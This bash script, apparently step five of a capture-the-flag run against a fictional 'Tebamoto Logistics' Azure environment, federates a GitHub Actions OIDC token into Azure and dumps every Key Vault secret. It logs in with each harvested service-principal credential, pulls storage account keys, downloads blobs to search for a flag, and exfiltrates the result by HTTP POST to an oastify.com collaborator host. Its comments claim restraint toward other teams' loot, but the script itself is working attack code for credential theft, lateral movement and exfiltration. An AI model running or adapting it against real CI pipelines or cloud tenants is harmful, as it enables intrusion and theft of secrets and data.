#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 6.
# Run 5 found sync-service-principal can list account keys on sttblcilogsprodx3euoz,
# but every download returned 0 bytes: `--file /dev/stdout -o none` does not emit.
# Fix: download to a real file and read it. Also report per-account why key listing fails.
#
# The 'loot' container holds other teams' exfil output (mi_loot_*.json, z_probe_marker.json,
# probe.txt ...). We pattern-match it for DF26{...} but never print or store its contents -
# finding someone else's answer there is not solving this.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value echoed; flag goes OOB only.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
FLAGRE='DF26\{[^}]+\}'
FOUND=""; FOUND_AT=""
WORK=$(mktemp -d); DL=$(mktemp -d)

say() { echo "[*] $*"; }

scan_account() {              # $1=account  $2=label of current identity
  local A="$1" WHO="$2" K AUTH M CL BL D SZ MM
  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>&1)
  if [ ${#K} -ge 40 ]; then AUTH=(--account-key "$K"); M=key
  else AUTH=(--auth-mode login); M=aad; fi
  CL=$(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>&1)
  if grep -qiE 'error|denied|forbidden|permission' <<<"$CL"; then
    say "    $A auth=$M containers -> $(head -c 110 <<<"$CL" | tr -d '\n')"; return 0
  fi
  say "    $A auth=$M containers: $(tr '\n' ' ' <<<"$CL" | head -c 120)"
  for C in $CL; do
    BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
    if grep -qiE 'error|denied|forbidden|permission' <<<"$BL"; then
      say "      $C -> $(head -c 110 <<<"$BL" | tr -d '\n')"; continue
    fi
    for B in $BL; do
      rm -f "$DL/blob"
      az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
         --file "$DL/blob" --overwrite -o none >/dev/null 2>&1
      [ -f "$DL/blob" ] || { say "      $C/$B -> download failed"; continue; }
      SZ=$(wc -c <"$DL/blob")
      MM=$(grep -aoE "$FLAGRE" "$DL/blob" | head -1)
      if [ "$C" = "loot" ]; then
        # other teams' dumping ground: match only, never show content
        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--} (contents not shown)"
      else
        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--}"
      fi
      if [ -n "$MM" ] && [ -z "$FOUND" ] && [ "$C" != "loot" ]; then
        FOUND="$MM"; FOUND_AT="$A/$C/$B ($WHO)"
      fi
      [ -n "$MM" ] && [ "$C" = "loot" ] && say "        (match in another team's loot file - ignored)"
    done
  done
}

federate() {
  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

federate && say "federated OK" || { say "federated FAILED"; exit 1; }
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
done
say "cached $(ls -1 "$WORK" | wc -l) principals"
ACCTS=$(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null)

say "=== as federated identity ==="
for A in $ACCTS; do scan_account "$A" "federated"; done

for F in "$WORK"/*; do
  [ -n "$FOUND" ] && break
  [ -s "$F" ] || continue
  S=$(basename "$F")
  CID=$(jq -r '.appId // .clientId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F")
  TEN=$(jq -r '.tenantId // empty' <"$F")
  az logout >/dev/null 2>&1
  az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
    --allow-no-subscriptions >/dev/null 2>&1 || { say "=== $S -> login failed"; continue; }
  say "=== as $S (${CID:0:8}…) ==="
  for A in $ACCTS; do scan_account "$A" "$S"; [ -n "$FOUND" ] && break; done
done

rm -rf "$WORK" "$DL"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND at $FOUND_AT (${#FOUND} chars) - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match outside loot"
fi
az logout >/dev/null 2>&1; say "done"
